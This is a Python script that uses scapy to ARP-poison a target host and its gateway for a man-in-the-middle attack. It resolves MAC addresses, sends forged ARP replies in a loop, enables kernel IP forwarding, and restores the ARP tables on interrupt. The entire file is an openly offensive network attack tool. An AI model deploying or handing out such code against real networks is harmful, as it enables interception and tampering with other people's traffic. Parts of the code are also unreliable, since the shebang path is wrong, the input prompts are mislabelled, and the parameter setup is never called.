#!/etc/usr/python3

import sys
import os
import time

from scapy.all import *
from scapy.layers.l2 import Ether, ARP


class ARP_poisoning:

    target_ip = ""
    gateway_ip = ""
    attack_ip = ""
    filter_ = ""
    interface = ""
    forward_ip = True  # change this to True if you use this with other MiTM attacks;

    def set_parameters(self):

        self.target_ip = input('Enter target IP address :')
        self.gateway_ip = input('Enter gateway IP address :')
        self.attack_ip = input('Enter target IP address :')
        self.filter_ = input('Enter target IP address : (ip, tcp ...')
        self.interface = input('Enter target IP address :')


    def set_filter(self, filter):
        self.filter_ = filter

    def set_interface(self, interface):
        self.interface = interface

    def set_ipdest(self, ipdest):
        self.target_ip = ipdest

    def set_ipsrc(self, ipsrc):
        self.attack_ip = ipsrc

    def set_iprouter(self, iprouter):
        self.gateway_ip = iprouter

    def get_filter(self):
        return self.filter_

    def get_interface(self):
        return self.interface

    def get_ipdest(self):
        return self.target_ip

    def get_ipsrc(self):
        return self.attack_ip

    def get_iprouter(self):
        return self.gateway_ip

    # In case you don't know your target MAC address
    def get_mac(self, ipdest):
        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ipdest)
        mac_address = srp(arp_packet, timeout=10, verbose=False)[0][0][1].hwsrc
        return mac_address

    def arp_injection(self, router_MAC, sensor_MAC):
        send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=sensor_MAC), verbose=False)
        send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=router_MAC), verbose=False)

    # IP_Forwardind for routing packets during MiTM attacks
    # Comment to use it with MAC

    def stop_ip_forward(self):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def start_ip_forward(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # if there is any probleme you can restore your network with this function then start again
    def restore_arp_tables(self):
        print("\n[*] Restoring Targets...")
        victimMac = self.get_mac(self.target_ip)
        gateMac = self.get_mac(self.gateway_ip)
        send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMac), count=10, verbose=False)
        send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMac), count=10, verbose=False)
        if (self.forward_ip):
            print("[*] Disabling IP Forwarding...")
            self.stop_ip_forward()
        print("[*] Shutting Down...")
        sys.exit(1)

    def poisoning(self):

        if (self.forward_ip):
            print("\n[*] Enabling IP Forwarding...\n")
        self.start_ip_forward()
        print("Trying to get MAC of : victim: " + self.target_ip)

        try:
            sensor_MAC = self.get_mac(self.target_ip)
        except Exception:
            if (self.forward_ip):
                self.stop_ip_forward()
                print("/!\ Couldn't Find Victim MAC Address")
                print("/!\ Exiting...")
                sys.exit(1)
        print("found MAC of : victim: " + sensor_MAC)
        print("Trying to get MAC of : gateway: " + self.gateway_ip)
        try:
            router_MAC = self.get_mac(self.gateway_ip)
        except Exception:
            if (self.forward_ip):
                self.stop_ip_forward()
                print("/!\ Couldn't Find Gateway MAC Address")
                print("/!\ Exiting...")
                sys.exit(1)
        print("found MAC of : gateway: " + router_MAC)
        print("[*] Poisoning Targets...")
        # Send the packets
        while 1:
            try:
                self.arp_injection(router_MAC, sensor_MAC)
                time.sleep(1)
            # Stop the program and restore the network
            except KeyboardInterrupt:
                self.restore_arp_tables()
                quit()


# main
if __name__ == '__main__':
    instance = ARP_poisoning()
    instance.poisoning()
